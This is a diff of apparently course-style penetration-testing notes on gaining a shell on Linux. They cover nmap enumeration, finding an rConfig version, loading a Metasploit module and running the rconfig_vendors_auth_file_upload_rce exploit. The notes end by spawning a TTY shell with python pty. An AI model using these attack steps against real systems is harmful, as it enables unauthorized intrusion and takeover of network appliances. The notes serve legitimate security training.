@@ -1,81 +1,76 @@
-# Infiltrating Unix/Linux Systems
-
-Establishing a shell session on a Unix/Linux system is a critical step for **pivoting** within internal networks, as over 70% of web servers run on Unix-based OSs.
-
-## Phase 1: Initial Enumeration
-
-The goal is to identify the **web stack**, **operating system**, and any **hosted applications** that may contain vulnerabilities.
-
-1. **Perform a service scan** to identify open ports and versions.
-2. **Analyze the output** for version numbers (e.g., Apache, PHP) and the Linux distribution (e.g., CentOS).
-3. **Navigate to the web application** via a browser using the `<TARGET_IP>` to identify the specific software in use.
-
-### Command Reference: Enumeration
-
-|Command|Description|
-|:--|:--|
-|`nmap -sC -sV <TARGET_IP>`|Performs a script scan and version detection on the target.|
+1. Scan target for web services and version strings.
+2. If rConfig is identified, check the footer for version (e.g., 3.9.6).
+3. Search Metasploit for associated modules.
+4. If local search fails, pull the `.rb` module from the Rapid7 GitHub repository.
+5. Manually add the module to the local Metasploit directory if necessary.
+6. Execute the exploit to obtain a Meterpreter session.
+7. Drop to a system shell and upgrade to a TTY if Python is available.
 
 ---
 
-## Phase 2: Vulnerability Discovery
+## Initial Enumeration
 
-Once an application is identified (e.g., **rConfig**), you must determine its version to find matching exploits. Tools like rConfig are high-value targets because they manage network appliances; compromising them can lead to control over the entire network.
+Probing an unknown target to identify the web stack, OS distribution, and running services.
 
-1. **Locate the version number**, often found at the bottom of login pages.
-2. **Search for public exploits** (CVEs, PoCs) using search engines or specialized databases like Exploit-DB.
-3. **Search Metasploit** for built-in modules.
+Initial sweep for service versions and default scripts
 
-### Command Reference: Vulnerability Searching
+```
+nmap -sC -sV <TARGET_IP>
+```
 
-|Command|Description|
-|:--|:--|
-|`msf6 > search rconfig`|Searches the Metasploit Framework for modules related to rConfig.|
+## Vulnerability Research
 
-### Handling Missing Metasploit Modules
+Application name and version are identified via web headers or page footers.
 
-If a known exploit (e.g., from a GitHub repo) is missing from your local Metasploit instance, you can manually add it.
+Search local Metasploit database for specific application modules
 
-|Step|Action|
-|:--|:--|
-|1|Locate the local Metasploit exploit directory using `locate exploits`.|
-|2|Save the `.rb` exploit file into the appropriate subdirectory (e.g., `/usr/share/metasploit-framework/modules/exploits/linux/http/`).|
-|3|Update the framework using `apt update; apt install metasploit-framework`.|
+```
+search rconfig
+```
 
----
+## Manual Module Integration
 
-## Phase 3: Exploitation (Metasploit)
+A known vulnerability exists but the **exploit module is missing** from the local Metasploit installation.
 
-Use Metasploit to deliver a payload and establish a session once a vulnerable application and matching module are confirmed.
+Identify the local Metasploit module filesystem path
 
-1. **Select the module** and configure the required options (RHOSTS, LHOST, etc.).
-2. **Launch the exploit** to trigger the payload and open a session.
+```
+locate exploits
+```
 
-### Command Reference: MSF Execution
+Update the local Metasploit Framework package
 
-|Command|Description|
-|:--|:--|
-|`use exploit/linux/http/<MODULE_NAME>`|Selects the specific exploit module.|
-|`exploit`|Executes the exploit against the target.|
+```
+apt update; apt install metasploit-framework
+```
 
----
+**Gotchas**: **Missing .rb extension** on manually added modules will prevent Metasploit from loading them.
 
-## Phase 4: Shell Stabilization
+## Exploit Execution
 
-Payloads executed by web services (like Apache) often result in a **non-TTY shell**. These shells lack a command prompt and do not support interactive commands like `su` or `sudo`, which are necessary for **privilege escalation**.
+Target is confirmed vulnerable to a specific rConfig RCE and the module is loaded.
 
-### Spawning a TTY Shell with Python
+Select the specific exploit module and initiate the attack
 
-If Python is installed, use it to manually spawn a TTY shell to gain access to a prompt and more system commands.
+```
+use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
+exploit
+```
 
-|Step|Goal|Command|
-|:--|:--|:--|
-|1|Verify Python exists|`which python`|
-|2|Drop into system shell|`shell` (within Meterpreter)|
-|3|**Spawn TTY**|`python -c 'import pty; pty.spawn("/bin/sh")'`|
+## TTY Shell Upgrade
 
-### Attack Implications
+The initial shell session is a **non-tty shell** lacking a prompt and the ability to execute interactive commands like `su` or `sudo`.
 
-- **Initial Access:** Typically as a low-privileged user (e.g., `apache`).
-- **Stabilization:** Spawning a TTY shell unlocks the ability to use interactive tools for further movement.
-- **Critical Discovery:** Exploiting management tools like rConfig can provide **admin access** to network appliances.
+Verify if Python is installed on the target
+
+```
+which python
+```
+
+Force a TTY shell spawn using Python
+
+```
+python -c 'import pty; pty.spawn("/bin/sh")'
+```
+
+**Gotchas**: **Non-TTY shells** often fail to handle environment variables correctly, preventing privilege escalation.
